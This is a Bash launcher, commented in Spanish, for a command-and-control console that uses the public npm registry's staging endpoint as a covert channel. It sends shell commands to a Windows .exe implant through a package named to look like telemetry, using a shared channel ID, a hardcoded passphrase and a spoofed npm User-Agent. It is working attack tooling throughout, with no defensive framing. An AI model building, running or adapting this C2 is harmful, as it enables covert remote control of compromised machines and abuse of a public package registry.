#!/usr/bin/env bash
# Consola C2 sobre el registro publico de npm, via transporte por staging.
#
#   ./c2.sh                    -> consola interactiva (a la escucha)
#   ./c2.sh "whoami"           -> un comando y su salida
#   ./c2.sh -c beef            -> usar otro canal (debe coincidir con el .exe)
#
# Por que staging y no dist-tags: con un token granular bypass-2FA, npm
# responde 403 en PUT /-/package/<pkg>/dist-tags. La unica escritura que npm
# sigue permitiendo a la automatizacion es POST /-/stage/package/<pkg>, y es
# a lo que ellos mismos dicen que hay que moverse para 2027.
set -euo pipefail

cd "$(dirname "$0")"

PKG="telemetry-relay-sdk"
CHAN="b0c1"                       # debe coincidir con --stage-chan del .exe
PASS="Relay-Key-2026"             # debe coincidir con --passphrase del .exe
BASE="https://registry.npmjs.org"

if [[ -f .c2token ]]; then
  TOKEN="$(< .c2token)"
else
  echo "[-] falta .c2token con el token npm (chmod 600)" >&2
  exit 1
fi

if [[ ! -x .venv/bin/python ]]; then
  echo "[-] falta el virtualenv en .venv" >&2
  exit 1
fi

# Canal explicito: ./c2.sh -c beef ...
if [[ "${1:-}" == "-c" ]]; then
  CHAN="$2"
  shift 2
fi
if [[ $# -gt 0 ]]; then
  # Comando suelto: todo lo que quede como una unica linea de shell.
  CMD="$*"
fi

# Comprobacion temprana: si el token no puede escribir en staging, la consola
# arrancaria y cada comando moriria sin explicar por que.
.venv/bin/python - "$BASE" "$TOKEN" <<'PY' || exit 2
import sys
import requests

base, token = sys.argv[1:3]
r = requests.get(f"{base}/-/stage", timeout=20,
                 headers={"Authorization": f"Bearer {token}",
                          "User-Agent": "npm/11.18.0 node/v22.7.0 win32 x64"})
if r.status_code == 401:
    print("[-] el token no vale para staging (401)", file=sys.stderr)
    sys.exit(2)
if r.status_code >= 300:
    print(f"[-] comprobacion del token: HTTP {r.status_code} {r.text[:120]}",
          file=sys.stderr)
    sys.exit(2)
PY

if [[ -n "${CMD:-}" ]]; then
  exec .venv/bin/python -m npm_c2 stage -p "$PKG" -t "$TOKEN" -c "$CHAN" \
    --passphrase "$PASS" --timeout 120 --interval 4 "$CMD"
fi

exec .venv/bin/python -m npm_c2 stage -p "$PKG" -t "$TOKEN" -c "$CHAN" \
  --passphrase "$PASS" --timeout 120 --interval 4
